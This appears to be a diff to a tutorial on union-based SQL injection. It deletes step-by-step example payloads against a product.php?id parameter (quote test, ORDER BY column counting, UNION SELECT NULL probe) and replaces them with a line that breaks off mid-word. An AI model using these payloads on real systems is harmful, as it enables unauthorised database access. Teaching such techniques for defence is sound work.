@@ -84,20 +84,4 @@ Union-based SQL injection leverages the UNION SQL operator to combine results fr
 
 **Example step-by-step:**
 
-1. Test for vulnerability:
-   ```sql
-   product.php?id=1'
-   ```
-
-2. Find number of columns:
-   ```sql
-   product.php?id=1 ORDER BY 5-- 
-   ```
-   Increase number until you get an error (error at 5 means 4 columns)
-
-3. Confirm with UNION:
-   ```sql
-   product.php?id=-1 UNION SELECT NULL,NULL,NULL,NULL--
-   ```
-
-4. Identify displayed columns by replacing NULLs one by one:
+Continue from Example Ste
